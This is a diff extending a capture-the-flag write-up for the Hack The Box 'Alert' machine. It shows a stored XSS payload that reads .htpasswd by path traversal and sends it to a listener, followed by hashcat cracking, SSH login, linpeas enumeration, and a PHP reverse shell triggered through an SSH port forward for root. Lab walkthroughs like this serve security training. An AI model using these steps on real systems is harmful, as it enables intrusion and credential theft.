@@ -86,6 +86,8 @@ So, the first thing to try out right now is to upload a Markdown file and once t
 
 There is also a Share button at the bottom right corner of the page. If we click on the button, with the XSS script in the Markdown, the script will still be executed. This means that this is a Stored XSS attack where the script is stored on the server and will be executed whenever the page is loaded. This is a very useful if we can get this to be executed by an administrator or a root user.
 
+## Exploitation
+
 Since we now have an XSS vulnerability, we can try uploading the "Share" link through the **Contact Us** page. So first, we need to get a XSS payload that can transmit useful information. The payload will look something like this:
 
 ```javascript
@@ -98,8 +100,48 @@ fetch("http://alert.htb/messages.php?file=../../../../../../../var/www/statistic
 </script>
 ```
 
-By using this script, we can get the server to provide us with the contents of the `.htpasswd` file and to receive the contents we will need to first 
+By using this script, we can get the server to provide us with the contents of the `.htpasswd` file and to receive the contents we will need to first set up a listener. To do this, we can run `python3 -m http.server 8888` using the same port number in the payload above. Once this listener is setup, we can send the payload to the website via the **Contact Us** form.
 
-## Exploitation
+Once the payload is sent, we can return to the listener and we should see some output.
+
+![Listener output](./Screenshots/capturing%20credentials.png)
+
+We can decode the output using any URL decoder tool, and we can extract only the useful information and save it to a file for further decrypting or brute forcing. The output will look something like this:
+
+```hash
+albert:$apr1$bMoRBJOg$igG8WBtQ1xYDTQdLjSWZQ/
+```
+
+Based on the output above, we can clearly identify the part of the hash that we need to crack. For this, I will be using `hashcat`. The command is as below:
+
+```bash
+hashcat -a 0 -m 1600 possible_credential.txt /path/to/wordlist
+```
+
+The password will be shown after a few minutes and we can use this to login to the target machine via SSH. The command is `ssh albert@alert.htb` and when prompted for the password, just paste the one cracked from hashcat. Once logged in, we can immediately retrieve the user flag by displaying the contents of user.txt in albert's home directory.
 
 ## Privilege Escalation
+
+After obtaining the user flag, the next thing to look for is the root flag, which is normally stored as `root.txt` in `/root`. To do this, we need root privileges, which we currently don't have. So to find privilege escalation opportunities, we can start by getting `linpeas.sh` in. To do this, we can use `curl`.
+
+Once `linpeas.sh.` is downloaded, we can add execute permissions to it and run it. The script will automatically scan for any potential vulnerabilities and report them to us. After running the script, we can see that there are several interesting paths as shown in the screenshot below:
+
+![Interesting paths](./Screenshots/Intersting%20Files.png)
+
+Looking into the directories highlighted in red, we can see that there are several PHP files and more directories.
+
+![Directory of the interesting paths](./Screenshots/Directory%20of%20Interesting%20FIles.png)
+
+And the `config` directory is actually editable by the `management` group, which `albert` is a part of. So we can go into this directory and write a reverse shell using PHP.
+
+![Reverse Shell in PHP](./Screenshots/reverse%20shell%20using%20php.png)
+
+However, even if we have this file, we still have no way of accessing or invoking this. So we need to go back to the output from linpeas and do further digging.
+
+Looking at the **Active Ports** section in linpeas, we see that port 8080 is actually open and listening for connections. We can forward this port so that we can visit the page that is being hosted on the port from our local machine. To so this we need to run:
+
+```bash
+ssh -L 8888:localhost:8080 albert@alert.htb
+```
+
+and once that command is executed, we can go back to our local machine's browser and visit `localhost:8888` to view the site. From the website, we can see that it is actually related to the web-monitor directory that we had access and made changes to it earlier. Since we know the path to the reverse shell, we can just append it to the URL to invoke the PHP file. So the URL will look something like this, `http://localhost:8888/config/shell.php`. Once this is run, and assuming we already have a listener running, we will have a reverse connection to the victim machine. We can then use this to get a root shell and obtain the root flag.
